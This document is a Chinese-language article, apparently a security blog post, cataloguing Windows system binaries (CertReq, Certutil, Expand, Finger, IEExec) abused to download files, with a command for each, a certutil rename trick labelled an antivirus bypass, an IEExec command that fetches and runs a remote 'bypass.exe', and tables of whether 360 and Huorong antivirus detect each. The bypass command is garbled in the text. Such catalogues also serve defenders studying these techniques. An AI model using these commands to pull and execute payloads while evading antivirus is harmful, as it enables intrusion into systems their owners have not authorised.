## CertReq.exe

certreq 命令可用于从证书颁发机构 (CA) 请求证书，从 CA 检索对先前请求的响应，从 .inf 文件创建新请求，接受并安装对请求的响应，从现有的
CA 证书或请求构建交叉认证或合格的从属请求，并签署交叉认证或合格的从属请求。

Paths:  
C:\Windows\System32\certreq.exe  
C:\Windows\SysWOW64\certreq.exe

system：  
Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10

下载文件命令：

    
    
    CertReq -Post -config https://example.org/ c:\windows\win.ini output.txt
    

注意：只支持POST类型的下载请求，c:\windows\win.ini内容为POST的数据请求体，可以随意定义。建议文件挂载服务器采用python
flask来满足POST类型的下载请求。

![1653386756_628cae046e21318e5a8b0.png!small?1653386758238](https://image.3001.net/images/20220524/1653386756_628cae046e21318e5a8b0.png!small?1653386758238)

杀软测试

360| 火绒  
---|---  
√| √  
  
## Certutil.exe

Certutil.exe 是一个命令行程序，作为证书服务的一部分安装。您可以使用 certutil.exe 转储和显示证书颁发机构 (CA)
配置信息、配置证书服务、备份和还原 CA 组件以及验证证书、密钥对和证书链。

paths:  
C:\Windows\System32\certutil.exe  
C:\Windows\SysWOW64\certutil.exe

system:  
Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10

下载命令：

    
    
    certutil -urlcache -split -f http:xxxx.xxxx.xxxx  a.txt
    

绕过命令：

    
    
    copy c:\windows\system32\certutil.exe a.exea.exea.exe -urlcache -split -f <http://xxxx.xxx.xxx.xxx/a.exe>a.exe

![1653549304_628f28f8a351bbcb03f4a.png!small?1653549305359](https://image.3001.net/images/20220526/1653549304_628f28f8a351bbcb03f4a.png!small?1653549305359)

杀软测试

360| 火绒  
---|---  
√| √  
  
## Expand.exe

展开一个或多个压缩文件。您还可以使用此命令从分发磁盘中检索压缩文件。

paths：  
C:\Windows\System32\Expand.exe  
C:\Windows\SysWOW64\Expand.exe

system:  
Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10

下载命令：

    
    
    expand \\webdav\folder\a.exe c:\ADS\a.exe
    

![1653549697_628f2a810b4a113c57dca.png!small?1653549697749](https://image.3001.net/images/20220526/1653549697_628f2a810b4a113c57dca.png!small?1653549697749)

缺点：  
只支持UNC路径下载，linux需要配置共享

杀软测试

360| 火绒  
---|---  
x| √  
  
## Finger.exe

显示有关正在运行finger服务或守护程序的指定远程计算机（通常是运行 UNIX 的计算机）上的用户的信息。远程计算机指定用户信息显示的格式和输出。

Paths:  
c:\windows\system32\finger.exe  
c:\windows\syswow64\finger.exe

system:  
Windows 8.1, Windows 10, Windows 11, Windows Server 2008, Windows Server
2008R2, Windows Server 2012, Windows Server 2012R2, Windows Server 2016,
Windows Server 2019, Windows Server 2022

下载命令：

    
    
    finger kali@192.168.180.190 | more +8 >1.txt
    

![1653549591_628f2a17e871ae40f3fa5.png!small?1653549592612](https://image.3001.net/images/20220526/1653549591_628f2a17e871ae40f3fa5.png!small?1653549592612)

注意：需要再服务端开启finger服务，再kali用户家目录下将下载的文件写入.plan文件中，具体参考https://www.slashroot.in/finger-server-configuration-linux。

杀软测试

360| 火绒  
---|---  
√| √  
  
## Ieexec.exe

IEExec.exe 应用程序是一个未记录的 Microsoft .NET Framework 应用程序，它包含在 .NET Framework
中。您可以将 IEExec.exe 应用程序用作主机来运行您使用 URL 启动的其他托管应用程序。

paths:  
C:\Windows\Microsoft.NET\Framework\v2.0.50727\ieexec.exe  
C:\Windows\Microsoft.NET\Framework64\v2.0.50727\ieexec.exe

system:  
Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10

下载并执行命令：

    
    
    C:\Windows\Microsoft.NET\Framework\v2.0.50727\ieexec.exe http://x.x.x.x:8080/bypass.exe
    

![1653549791_628f2adf2de08aee3ed42.png!small?1653549791872](https://image.3001.net/images/20220526/1653549791_628f2adf2de08aee3ed42.png!small?1653549791872)

杀软测试

360| 火绒  
---|---  
X| √

